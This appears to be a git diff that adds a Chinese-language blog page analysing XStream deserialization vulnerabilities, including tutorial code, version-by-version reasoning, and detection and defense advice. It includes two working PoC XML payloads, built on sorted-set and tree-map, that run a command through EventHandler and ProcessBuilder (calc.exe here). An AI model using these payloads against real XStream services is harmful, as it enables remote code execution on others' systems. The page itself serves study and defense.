@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="XStream简介XStream是Java类库，可以用来将对象序列化为XML格式或将XML反序列化为对象。 XStream 序列化与反序列化操作下面看下如何使用XStream进行序列化和反序列化操作的。 先定义IPerson.java接口类： 123public interface IPerson &#123;    void output();&#125;    接着定义Person类实现前面的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2025/01/06/XSream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="XStream简介XStream是Java类库，可以用来将对象序列化为XML格式或将XML反序列化为对象。 XStream 序列化与反序列化操作下面看下如何使用XStream进行序列化和反序列化操作的。 先定义IPerson.java接口类： 123public interface IPerson &#123;    void output();&#125;    接着定义Person类实现前面的">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-01-06T15:36:07.763Z">
+<meta property="article:modified_time" content="2025-01-06T03:07:53.647Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-XSream反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/06/XSream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  <time class="dt-published" datetime="2025-01-06T15:36:07.763Z" itemprop="datePublished">2025-01-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="XStream简介"><a href="#XStream简介" class="headerlink" title="XStream简介"></a>XStream简介</h1><p>XStream是Java类库，可以用来将对象序列化为XML格式或将XML反序列化为对象。</p>
+<h1 id="XStream-序列化与反序列化操作"><a href="#XStream-序列化与反序列化操作" class="headerlink" title="XStream 序列化与反序列化操作"></a>XStream 序列化与反序列化操作</h1><p>下面看下如何使用XStream进行序列化和反序列化操作的。</p>
+<p>先定义IPerson.java接口类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IPerson</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">output</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>接着定义Person类实现前面的接口：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">IPerson</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">output</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;Hello, this is &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;, age &quot;</span> + <span class="built_in">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>XStream序列化是调用XStream.toXML()来实现的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">&quot;mi1k7ea&quot;</span>;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>(<span class="keyword">new</span> <span class="title class_">DomDriver</span>());</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xstream.toXML(p);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出内容：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Person&gt;</span><br><span class="line">  &lt;name&gt;mi1k7ea&lt;/name&gt;</span><br><span class="line">  &lt;age&gt;<span class="number">6</span>&lt;/age&gt;</span><br><span class="line">&lt;/Person&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将输出结果保存为person.xml文件。</p>
+<p>XStream反序列化是用过调用XStream.fromXML()来实现的，其中获取XML文件内容的方式可以通过Scanner()或FileInputStream都可以：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.io.xml.DomDriver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line"><span class="comment">//        String xml = new Scanner(new File(&quot;person.xml&quot;)).useDelimiter(&quot;\\Z&quot;).next();</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;person.xml&quot;</span>);</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>(<span class="keyword">new</span> <span class="title class_">DomDriver</span>());</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) xstream.fromXML(xml);</span><br><span class="line">        p.output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, <span class="built_in">this</span> is mi1k7ea, age <span class="number">6</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="CVE-2013-7258：基于sorted-set的PoC"><a href="#CVE-2013-7258：基于sorted-set的PoC" class="headerlink" title="CVE-2013-7258：基于sorted-set的PoC"></a>CVE-2013-7258：基于sorted-set的PoC</h1><h2 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h2><p>1.4.5，1.4.6，1.4.10</p>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>调试过程没啥意义，直接文字写流程。</p>
+<p>这是一个<sorted-set>标签，会被TreeSetConverter转成java.lang.TreeSet对象。</p>
+<p>先是反序列化每个对象放到一个用于暂时缓存的sortedMap中，全部处理完后，再把sortedMap放到resultMap中，使用TreeMap.putAll()完成。</p>
+<p>TreeMap.putAll()会调用TreeMap.put()函数，TreeMap.put()会调用o2.compareTo(o1)函数。</p>
+<p>compareTo是Comparable中的方法，会触发事件监听，也就是会触发EventHandler的invoke方法，即ProcessBuilder.start(“calc.exe”)，弹出计算机。</p>
+<h2 id="无法通杀"><a href="#无法通杀" class="headerlink" title="无法通杀&lt;&#x3D;1.3.1版本的原因"></a>无法通杀&lt;&#x3D;1.3.1版本的原因</h2><p>&lt;&#x3D;1.3.1以下版本不能成功识别出根标签sorted-set的类，也就是说低版本并不支持sorted-set。</p>
+<h2 id="无法通杀1-4-1-4-4"><a href="#无法通杀1-4-1-4-4" class="headerlink" title="无法通杀1.4 - 1.4.4"></a>无法通杀1.4 - 1.4.4</h2><p>定位到TreeSetConverter#unmarshal方法，从前面的分析知道，这里就是恢复TreeSet的过程，而对于TreeSet的恢复，使用了两种策略：</p>
+<p>第一种：直接使用TreeSet#addAll(set)来添加预先放置在set(PresortedSet)中的元素，因此不会进行排序，而是按照添加顺序默认排序的</p>
+<p>第二种：调用TreeMap#putAll(map)经过排序后再添加回TreeSet。上面分析的就是第二种方式。</p>
+<p>而XStream决定这两种策略的关键变量是sortedMapField。</p>
+<p>在1.4 - 1.4.4版本中，XStream对SortedSet的默认处理是使用的第一种方式，所以sortedMapField是null，导致treeMap也是null，这样最终就会调用result.addAll(set);来填充元素到TreeSet中，更底层一些只会调用TreeMap#addAllForTreeSet而并不会调用TreeMap#putAll，因此不会触发proxy.compareTo。</p>
+<h2 id="无法通杀1-4-7-1-4-9"><a href="#无法通杀1-4-7-1-4-9" class="headerlink" title="无法通杀1.4.7 - 1.4.9"></a>无法通杀1.4.7 - 1.4.9</h2><p>在1.4.7的ChangeLog中，对症下药把EventHandler给ban了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.bean.EventHandler no longer handled automatically because of severe security vulnerability.</span><br></pre></td></tr></table></figure>
+
+<p>具体是在ReflectionConverter#canConvert()中，添加了对EventHandler的过滤。根据前面的分析我们也知道，EventHandler的是Converter是ReflectionConverter。</p>
+<h2 id="1-4-10又能成功了"><a href="#1-4-10又能成功了" class="headerlink" title="1.4.10又能成功了"></a>1.4.10又能成功了</h2><p>在1.4.10，XStream推出了初始化默认安全框架的方法，也就是为用户默认集成好了一些过滤规则，是基于白名单的。但是默认不会开启，需要调用setupDefaultSecurity来开启。但离谱的是，同时把1.4.7的修复给删了，所以导致在未显式调用setupDefaultSecurity开启安全框架时，1.4.7之前的洞又成功了。</p>
+<h1 id="CVE-2013-7258：基于tree-map的PoC"><a href="#CVE-2013-7258：基于tree-map的PoC" class="headerlink" title="CVE-2013-7258：基于tree-map的PoC"></a>CVE-2013-7258：基于tree-map的PoC</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>fookey<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>foovalue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>该payload涉及到的转换器是TreeMapConverter，至于其整个调用过程以及原理和前面sorted-set的差不多，只是转换器不一样了，这里就不再调试分析了。</p>
+<h2 id="适用版本："><a href="#适用版本：" class="headerlink" title="适用版本："></a>适用版本：</h2><p>通杀1.4.x系列有漏洞的版本，即&lt;&#x3D;1.4.6或&#x3D;1.4.10。</p>
+<h2 id="无法通杀-1"><a href="#无法通杀-1" class="headerlink" title="无法通杀&lt;&#x3D;1.3.1版本的原因"></a>无法通杀&lt;&#x3D;1.3.1版本的原因</h2><p>运行PoC会报错显示TreeMap没有包含comparator元素，即不支持PoC中两个子标签元素调用compareTo()进行比较，因此无法利用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.thoughtworks.xstream.converters.ConversionException: TreeMap does not contain &lt;comparator&gt; element</span><br></pre></td></tr></table></figure>
+
+<p>在TreeMapConverter.unmarshal()中看到，判断子标签节点是否有comparator，若两个if判断条件都不满足则直接抛出异常，不会进入后面的populateMap()函数，因此也不会成功触发。</p>
+<h2 id="无法通杀1-4-7-1-4-9版本的原因"><a href="#无法通杀1-4-7-1-4-9版本的原因" class="headerlink" title="无法通杀1.4.7-1.4.9版本的原因"></a>无法通杀1.4.7-1.4.9版本的原因</h2><p>和前面基于sorted-set的PoC的原因是一样的。</p>
+<h1 id="检测和防御"><a href="#检测和防御" class="headerlink" title="检测和防御"></a>检测和防御</h1><h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p>查看目标环境中是否有存在漏洞版本的XStream的jar包，即1.4.x系列版本中&lt;&#x3D;1.4.6或&#x3D;1.4.10；</p>
+<p>全局搜索是否存在Xstream.fromXML(的地方，若存在则进一步分析该参数是否外部可控；若为1.4.10版本的还需要确认是否开启了安全配置进行了有效的防御；</p>
+<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ul>
+<li>将XStream升级到最新版，即1.4.11之后的版本；</li>
+<li>若只想手动修改代码，可以参考1.4.7-1.4.9版本的修补方法，在ReflectionConverter.canConvert()函数中添加了对包括EventHandler等类的过滤，当然这只是黑名单过滤方式，存在绕过风险。</li>
+<li>若版本号&gt;&#x3D;1.4.7，XStream提供了一个安全框架供用户使用，但必须手工设置，可以调用addPermission()、allowTypes()、denyTypes()等对某些类进行限制，即建立黑白名单机制进行过滤</li>
+</ul>
+<p>链接：<a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/10/21/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">http://www.mi1k7ea.com/2019/10/21/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/06/XSream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cm5l7vlht000afscxab1xg16q" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/01/06/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/01/06/shiro%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/01/06/JNDI%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/06/%E5%8E%9F%E7%94%9FJDK%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/06/CC%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/06/CB%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/06/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
